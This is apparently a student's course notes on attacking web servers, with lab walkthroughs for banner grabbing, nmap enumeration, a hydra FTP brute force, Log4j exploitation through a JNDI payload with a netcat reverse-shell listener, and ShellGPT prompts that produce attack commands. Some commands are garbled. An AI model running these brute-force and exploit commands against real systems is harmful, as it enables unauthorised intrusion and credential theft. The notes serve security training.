x`2025-08-02 15:06

Status:

Tags:

# Hacking Web servers

## Web Server Attacks
### DNS Server Hijacking

![[Pasted image 20250802150826.png]]
![[Pasted image 20250802151023.png]]


### Directory Traversal Attacks 
The design of web servers limits public access to some extent. Directory traversal is the exploitation of HTTP through which attackers can access restricted directories and execute commands outside the web server’s root directory by manipulating a Uniform Resource Locator (URL). In directory traversal attacks, attackers use the dot-dot-slash (../) sequence to access restricted directories outside the web server’s root directory. Attackers can use the trial-and-error method to navigate outside the root directory and access sensitive information in the system. 
### Web Server Misconfiguration 
an be exploited to launch various attacks on web servers, such as directory traversal, server intrusion, and data theft. The following are some web server misconfigurations: ▪ Verbose debug/error messages ▪ Anonymous or default users/passwords ▪ Sample configuration and script files ▪ Remote administration functions ▪ Unnecessary services enabled ▪ Misconfigured/default SSL certificates
Examples of Web Server Misconfigurations “Keeping the server configuration secure requires vigilance”—Open Web Application Security Project (OWASP) 

### HTTP Response-Splitting Attack
 HTTP response-splitting attack is a web-based attack in which the attacker tricks the server by injecting new lines into response headers, along with arbitrary code. It involves adding header response data into the input field so that the server splits the response into two responses. This type of attack exploits vulnerabilities in input validation. Cross-site scripting (XSS), cross-site request forgery (CSRF), and Structured Query Language (SQL) injection are examples of this type of attack. 

### SSH Brute Force Attack
Attackers use SSH protocols to create an encrypted SSH tunnel between two hosts to transfer unencrypted data over an insecure network. Usually, SSH runs on TCP port 22. To perform an attack on SSH, an attacker scans the entire SSH server using bots (performs a port scan on TCP port 22) to identify possible vulnerabilities. With the help of a brute-force attack, the attacker obtains login credentials to gain unauthorized access to an SSH tunnel. An attacker who obtains the login credentials of SSH can use the same SSH tunnels to transmit malware and other means of exploitation to victims without being detected. Attackers use tools such as Nmap and Ncrack on a Linux platform to perform an SSH brute-force attack.
![[Pasted image 20250802151752.png]]

### FTP Brute Force with AI

- “Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords from wordlists” 
The output of this prompt results in the following command:
- ``hydra -L/usr/share/wordlists/ftp-usernames.txt -p /usr/share/wordlists/ftp-passwords.txt ftp://10.10.1.11``

### HTTP/2 Continuation Flood Attack
![[Pasted image 20250802151954.png]]

### Other Web Server Attacks 
#### Web Server Password Cracking 
An attacker attempts to exploit weaknesses to hack well-chosen passwords. The most common
passwords found are password, root, administrator, admin, demo, test, guest, qwerty, pet names, and so on. The attacker mainly targets the following through web server password cracking: ▪ SMTP and FTP servers ▪ Web shares ▪ SSH tunnels ▪ Web form authentication

#### DoS/DDoS Attacks
A DoS/DDoS attack involves flooding targets with copious fake requests so that the target stops functioning and becomes unavailable to legitimate users. By using a web server DoS/DDoS attack, an attacker attempts to take the web server down or make it unavailable to legitimate users. A web server DoS/DDoS attack often targets high-profile web servers such as bank servers, credit-card payment gateways, and even root name servers.
![[Pasted image 20250802152209.png]]

#### Man-in-the-Middle Attack
![[Pasted image 20250802152235.png]]
#### Phishing Attacks
![[Pasted image 20250802152257.png]]
#### Web Application Attacks
- Server-Side Request Forgery (SSRF) Attack: 
-  Parameter/Form Tampering:
- Cookie Tampering: 
- Unvalidated Input and File Injection Attacks: 
-  Session Hijacking:
- SQL Injection Attacks:
- Directory Traversal:
-  Denial-of-Service (DoS) Attack:
-  Cross-Site Scripting (XSS) Attacks: 
- Buffer Overflow Attacks: 
-  Cross-Site Request Forgery (CSRF) Attack:
- Command Injection Attacks:
- Source Code Disclosure: 
## Web Server Attack Methodology
### Information Gathering 
here are the tools used for information gathering  
-  who.is
- Whois Lookup (https://whois.domaintools.com) 
- Whois (https://www.whois.com) 
- Domain Dossier (https://centralops.net) 
- Subdomain Finder (https://pentest-tools.com)
### Information Gathering from Robots.txt File 
An attacker types URL/robots.txt in the address bar of a browser to view the target website’s robots.txt file. An attacker can also download the robots.txt file of a target website using the Wget tool.

### Web Server Footprinting
Web Server Footprinting Tools 
- Netcat
	- command 
		 - ``nc –vv www. moviescope.com 80 – press [Enter]``
		 - `` GET / HTTP/1.0 - press [Enter] twice``
- Telnet 
	- command 
		- `` telnet www.moviescope.com 80`` and press Enter. 
		- `` Type GET / HTTP/1.0 ``and press Enter twice.  
* httprecon (app abased)
### Web Server Footprinting with AI
- prompt 
	-  “Perform webserver footprinting on target IP 10.10.1.22”
	- command 
		- ``nmap -SV 10.10.1.22 && whatweb 10.10.1.22 && nikto -h 10.10.1.22``
- Web Server Footprinting using Netcat with AI
"Perform webserver footprinting on target IP 10.10.1.22 with netcat”
- command 
	- `` nc -v 10.10.1.22 80 <<EOF
	- ``HEAD/HTTP/1.1 Host: 10.10.1.22 
	- ``EOF``
### IIS Information Gathering using Shodan
-  Use the following filter to search for any IIS server and to provide a list of instances running IIS:  http.title:"IIS"
-  Use the following filter to identify IIS servers with SSL certificates issued to "Company_name" that can assist in finding servers associated with a specific organization:
	- Ssl:"Company Inc." http.title:"IIS"
 - Use the following filter to locate IIS servers with SSL certificates where the common name (CN) is "company.in":
	 - Ssl.cert.subject.CN:"company.in" http.title:"IIS"
	 - This can assist in identifying servers associated with a specific domain or subdomain.
-  Use the following filter to identify IIS servers in the US that can aid in geographically targeted attacks:
	- http.title:"IIS Windows Server" country:"US"
 -  Use the following filter to locate IIS7 servers running on port 80: 
	 - http.title:"IIS7" port:80
-  Use the following filter to search for IIS7 servers within a specific IP range to assist in network-specific information gathering:
	- http.title:"IIS7" net:"<IP_address>/24"
-  http.title:"IIS7" – Identifies IIS servers running version 7, useful for finding specific version vulnerabilities.
-  http.title:"IIS Windows Server" - Targets IIS servers on Windows, helpful for Windows-specific exploitation.
- http.title:"Internet Information Services" - Broad search for any IIS servers, useful for general information gathering.

### Abusing Apache mod_userdir to Enumerate User Accounts
- Enumerating User Accounts from the Apache Server ▪
	- Perform Initial Scan to Enumerate Valid Users 
	- Run the following command to enumerate valid users from the target web server with mod_userdir enabled: 
		- ``nmap -p80 --script http-userdir-enum <target>``
- Perform Customized Scan
- A customized list of potential usernames can be used to improve the accuracy and effectiveness of the attacks. 
	- Run the following command with the custom word list ``‘<Wordlist>.txt’:
		- ``nmap -p80 --script http-userdir-enum userdir.users=<Wordlist>.txt <target>``
-  Bypass Detection with Custom User Agent
- ``nmap -p80 --script http-brute --script-args http.useragent="<User_Agent>" <target>``

### Enumerating Web Server Information Using Nmap 
 - Discover virtual domains with hostmap:
	  - ``nmap --script hostmap-bfk <host>``
-  Detect a vulnerable server that uses the TRACE method:
	- `` nmap --script http-trace -p80 localhost``
-  Harvest email accounts with http-google-email: 
	- ``nmap --script http-google-email <host>``
-  Enumerate users with http-userdir-enum: 
	- ``nmap -p80 --script http-userdir-enum localhost``
-  Detect HTTP TRACE:
	- ``nmap -p80 --script http-trace <host>``
- Check if the web server is protected by a web application firewall (WAF) or IPS:
	- ``nmap -p80 --script http-waf-detect --script-args=”http-waf-detect.uri=/testphp.vulnweb.com/artists.php,http-waf-detect.detectBodyChanges” www.modsecurity.org``
-  Fingerprint a WAF
	- ``nmap --script=http-waf-fingerprint -p80,443 <host>``
-  Enumerate common web applications 
	- ``nmap --script http-enum -p80 <host>``
-  Obtain robots.txt 
	- ``nmap -p80 --script http-robots.txt <host>``
- some other scripts
	- ``  nmap -sV –O –p target IP address ``
	- ``nmap -sV --script http-enum target IP address`` 
	- ``nmap target IP address -p 80 --script = http-frontpage-login ``
	- `` nmap --script http-passwd --script-args http-passwd.root =/ target IP address``
### Finding Default Credentials of Web Server
 - websites for finding the default passwords of web server administrative interfaces: 
	 - https://www.fortypoundhead.com 
	 - https://www.defaultpassword.com 
	 - https://default-password.info 
	 - https://www.routerpasswords.com
	-  cirt.net
### Finding Default Content of Web Server 
- Tools such as Nikto2 can be used to identify default contents. 
	- Nikto2 

### Directory Brute Forcing 
Attackers use tools such as Dirhunt and Sitechecker Website Directory Scanner to find directory listings of the target web server.
#### Directory Brute Forcing with AI 
- “Perform a directory traversal on target url https://certifiedhacker.com”
	- command 
		- ``gobuster dir -u https://certifiedhacker.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ``
### Vulnerability Scanning 
- The following are some additional vulnerability scanning tools: 
	- OpenText Fortify WebInspect (https://www.opentext.com) 
	- Tenable.io (https://www.tenable.com) 
	- ImmuniWeb (https://www.immuniweb.com) 
	- Invicti (https://www.invicti.com)
	- Acunetix Web Vulnerability Scanner 
### Nginx Vulnerability Scanning using Nginxpwner 
- steps to Scan the Target Nginx Web Server for Vulnerabilities 
- Run the following command to create a temporary file to store a list of potential URL paths acquired via crawling or other methods: 
	- ``nano /tmp/pathlist`` 
- Insert the paths into this file, then save and exit using CTRL+X.
- Execute the nginxpwner script, specifying the target URL and the path file: 
- ``python3 nginxpwner.py <target_URL> /tmp/<pathlist> 
- Replace ``<target_URL>`` and ``/tmp/<pathlist>`` with the actual target URL and path to your list file.
### Finding Exploitable Vulnerabilities 
- use  Exploit Database Website 

#### Finding Exploitable Vulnerabilities with AI 
- “Identify OS and services running on the target 10.10.1.19 and then install and launch the searchsploit to find out the possible exploits associated with OS and services identified”
	- command 
		- ``nmap -SV-0 10.10.1.19 -oX nmap_scan.xml && sudo apt-get install exploitdb -y && searchsploit-nmap nmap_scan.xml``
### Session Hijacking 
- Burp Suite
### Web Server Password HackingWeb Server Password Hacking
-  The attacker can also use automated tools to crack web passwords and hashes.  such as - 
	- Hashcat
	- Hydra 
	- Ncrack 
### Using Application Server as a Proxy
![[Pasted image 20250802161007.png]] 
### Path Traversal via Misconfigured NGINX Alias 
Webroot Misconfiguration in nginx.conf File
- ``location /i {
- ``alias /data/w3/images/;
- ``}``
Exploiting This Vulnerability Using Kyubi 
kyubi -v <target_URL>

### Web Server Attack Tools 
-  Immunity’s CANVAS 
- OpenVAS (https://www.openvas.org) 
- THC Hydra (https://github.com) 
- HULK DoS (https://github.com) 
- MPack (https://sourceforge.net)


# Lab 1: Footprint the Web Server
## Task 1: Footprint a Web Server using Netcat and Telnet
Netcat will perform the banner grabbing and gather information such as content type, last modified date, accept ranges, ETag, and server information.

- open parrot 
 1. using netcat command 
	 - ``nc -vv www.moviescope.com 80``
	 - `` GET / HTTP/1.0
2. using Telnet 
	- `` telnet www.moviescope.com 80``
	- `` GET / HTTP/1.0``


## Task 2: Enumerate Web Server Information using Nmap Scripting Engine (NSE)
1. open terminal as sudo
-  directories used by web servers and web applications, in the
	- ``**nmap -sV --script=http-enum www.goodshopping.com ``
- to discover the hostnames that resolve the targeted domain.
	- ``nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com``
- HTTP trace on the targeted domain
	- ``nmap --script http-trace -d www.goodshopping.com``
- Web Application Firewall is configured on the target host or domain
	- ``nmap -p80 --script http-waf-detect www.goodshopping.com``

# Lab 2: Perform a Web Server Attack
## Task 1: Crack FTP Credentials using a Dictionary Attack
1.  to nmap on windows 11
	- `` nmap -p 21 10.10.1.11``
2. passoword craking of ftp using hardra
	- `` **hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://10.10.1.11``
	- after cracked login as 
	- `` fpt 10.10.1.11``
		- ``Martin:apple``
	- ``help`` for ftp commands that can be run
- done 

## Task 2: Gain Access to Target Web Server by Exploiting Log4j Vulnerability
1. open Ubuntu as sudo 
	- open terminal 
		- ``sudo apt- get update``
2. download docker 
	- ``apt-get install docker.io``
	-  ``cd log4j-shell-poc/ ``
3. to setup log4j vulnerable server
	- ``docker build -t log4j-shell-poc .``
4.  to start the vulnerable server.
	- ``docker run --network host log4j-shell-poc``
 5. run nmap on ubuntu 
	 -  `` nmap -sV -sC 10.10.1.9``
	 -  port **8080** is open and **Apache Tomcat/Coyote 1.1** server is running on the target system.
	 - ``**searchsploit -t Apache RCE** ``
	 - r **Apache Log4j 2 - Remote Command Execution (RCE)**
	  - open browser and go ``http:// 10.10.1.9:8080``
	  - `` cd  **log4j-shell-poc/**``	    
---xx----xxx--xx--for---attack--below-------
6. We need to extract JDK zip file which is already placed at **/home/attacker** location.
	- ``tar -xf jdk-8u202-linux-x64.tar.gz``
	 - ``mv jdk1.8.0_202 /usr/bin/``
7. we need to update the installed JDK path in the **poc.py** file.
	- `` cd log4j/ ``
	- ``pluma poc.py ``
	- in line **62**, replace  ``jdk1.8.0_20/bin/javac``with ``/usr/bin/jdk1.8.0_202/bin/javac``
	- in line **87** and replace  ``jdk1.8.0_20/bin/java`` with ``/usr/bin/jdk1.8.0_202/bin/java``
	-  line **99** and replace ``jdk1.8.0_20/bin/java`` with ``/usr/bin/jdk1.8.0_202/bin/java``
8. type  ``nc -lvp 9001``
	- ``python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001``
	- login as user: ``${jndi:1dap://10.10.1.13:1389/a}`` and ``Password``
	- check netcat lis
- done 

# Lab 3: Perform a Web Server Hacking using AI
## Task 1: Perform Web Server Footprinting and Attacks using ShellGPT
1. To perform directory traversal using ShellGPT, run
	- ``**sgpt --shell "Perform a directory traversal on target url https://certifiedhacker.com using gobuster"``
	- command 
		- ``gobuster dir -u https://certifiedhacker.com -w/ust/share/wordlists/dirb/common.txt ``
2. To perform FTP bruteforce attack run 
	- ``sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists"``
	- command 
		- ``hydra -L /home/attacker/Wordlists/usernames.txt -P/home/attacker/Wordlists/passwords.txt ftp://10.10.1.11 ``
3.   To perform webserver footprinting on target IP address using ShellGPT, run 
	- ``sgpt --shell "Perform webserver footprinting on target IP 10.10.1.22"``
	- command 
		- ``nmap -sV -Pn 10.10.1,22 8& whatweb 10.10.1.22 8& nikto -h 10.10.1.22``
4. To perform website mirroring using ShellGPT, run
	- ``sgpt --shell "Mirror the target website certifiedhacker.com"``
	- command 
		- ``wget -mirror -convert-links •-adust-extension •-page-requisites •-no-parent http://certztledhacken
Cott ``

 ### References
``hydra -L/usr/share/wordlists/ftp-usernames.txt -p /usr/share/wordlists/ftp-passwords.txt ftp://10.10.1.11``



